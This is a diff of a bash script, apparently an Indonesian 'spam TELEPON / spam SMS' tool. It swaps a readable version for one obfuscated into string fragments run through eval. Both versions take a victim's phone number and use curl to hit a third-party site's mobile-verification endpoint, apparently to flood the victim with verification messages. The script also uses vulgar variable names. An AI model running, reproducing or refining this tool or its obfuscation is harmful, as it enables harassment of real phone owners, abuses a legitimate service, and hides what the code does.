@@ -1,26 +1,7 @@
-#usr/bin/bash
-clear
-echo "==========================="
-echo "Creator : Ujang"
-echo "YouTube : Ujang Hmzzz"
-echo "==========================="
-echo ""
-echo "[1] Spam TELEPON"
-echo "[2] Spam SMS"
-echo ""
-   read -p "Masukan Pilihan (1/2): " memek
+#MauNgapainBrooo
+#SubscribeUjangHmzzz
+z="
+";oz='then';JBz='$kon';KBz='toll';QBz='fi';Cz='echo';OBz='$lin';Ez='====';Gz=' "Cr';Dz=' "==';ABz='.jag';RBz='= 2 ';Vz='ON"';iz='mek';Qz=' ""';Uz='ELEP';yz='//id';Xz='am S';Yz='MS"';CBz='rd.c';Iz='r : ';lz='mek ';UBz='ee"';Fz='="';FBz='r/ve';hz='" me';Sz='] Sp';NBz=' -s ';Jz='Ujan';SBz=' "By';DBz='om/m';wz='="ht';Wz=' "[2';jz='if [';kz=' $me';MBz='curl';LBz='"';Nz='e : ';Bz='r';uz='ll';Az='clea';GBz='rify';Rz=' "[1';tz='onto';Hz='eato';cz='ukan';Kz='g"';BBz='rewa';sz=' " k';IBz='ile/';dz=' Pil';Mz='uTub';HBz='-mob';fz=' (1/';az=' -p ';EBz='embe';Tz='am T';vz='link';bz='"Mas';xz='tps:';ez='ihan';pz=' No ';Lz=' "Yo';nz=']';Zz='read';Oz='g Hm';mz='= 1 ';PBz='k';TBz='eeee';rz='et :';gz='2): ';qz='Targ';Pz='zzz"';VBz='exit';
+eval "$Az$Bz$z$Cz$Dz$Ez$Ez$Ez$Ez$Ez$Ez$Fz$z$Cz$Gz$Hz$Iz$Jz$Kz$z$Cz$Lz$Mz$Nz$Jz$Oz$Pz$z$Cz$Dz$Ez$Ez$Ez$Ez$Ez$Ez$Fz$z$Cz$Qz$z$Cz$Rz$Sz$Tz$Uz$Vz$z$Cz$Wz$Sz$Xz$Yz$z$Cz$Qz$z$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$z$jz$kz$lz$mz$nz$z$oz$z$Zz$az$bz$cz$pz$qz$rz$sz$tz$uz$z$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$z$MBz$NBz$OBz$PBz$z$QBz$z$jz$kz$lz$RBz$nz$z$oz$z$Az$Bz$z$Cz$SBz$TBz$UBz$z$VBz$z$QBz"
 
-#UjangHmzzz
-if [ $memek = 1 ]
-then
-read -p "Masukan No Target : " kontoll
-link="https://id.jagreward.com/member/verify-mobile/$kontoll"
-curl -s $link
-fi
-#UjangHmzzz
-if [ $memek = 2 ]
-then
-clear
-echo "Byeeeeee"
-exit
-fi
+
